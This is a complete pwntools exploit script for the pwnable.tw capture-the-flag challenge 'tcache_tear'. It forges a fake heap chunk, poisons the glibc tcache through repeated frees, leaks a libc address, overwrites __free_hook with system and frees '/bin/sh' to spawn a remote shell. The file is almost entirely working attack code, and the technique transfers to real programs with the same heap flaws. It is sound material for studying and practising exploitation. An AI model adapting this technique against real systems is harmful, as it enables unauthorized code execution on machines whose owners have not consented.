#!/usr/bin/python3
from pwn import *

PATH = "./tcache_tear"
HOST, PORT = "chall.pwnable.tw", 10207
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF("libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so", checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '57']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def build_gs():
    return f'''
        b*0x0000000000400C07
        memory watch 0x602060 10
        c
    '''
def GDB(gs):
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

p = conn()
GDB(build_gs())

def choice(num):
    sna(b"Your choice :", num)

def malloc1(size, data=b"data"):
    choice(1)
    sna(b"Size:", size)
    sa(b"Data:", data)

def free2():
    choice(2)

def print3():
    choice(3)

name = 0x0000000000602060

sa(b"Name:", p64(0) + p64(0x501) + p64(0) + p64(0x20))
malloc1(10)
free2()
malloc1(0x40)
free2()

#4
malloc1(10, b"A"*16 + b"B"*8 + p64(0x51) + p64(name+0x20) + b"C"*0x40)
malloc1(0x40)
malloc1(0x40, p64(0) + p64(name+0x20) + p64(0) + p64(0x21)*3)
free2()

#8
malloc1(10, p64(0)+ p64(name+0x10) + p64(0x11)*(0x500//8 + 100))
free2()

#10
print3()
p.recvuntil(b"Name :")
libc_leak = info(u64(p.recv(24)[16:]), "libc_leak")
libc.address = info(libc_leak - 0x3ebca0, "libc.address")

#11
for i in range(5):
    malloc1(0xf0)

#16
malloc1(10)
free2()
malloc1(0x50)
free2()

#20
malloc1(10, b"A"*16 + b"B"*8 + p64(0x61) + p64(libc.sym.__free_hook))
malloc1(0x50)
malloc1(0x50, p64(libc.sym.system))
malloc1(0x50, b"/bin/sh\0")
free2()

p.interactive()
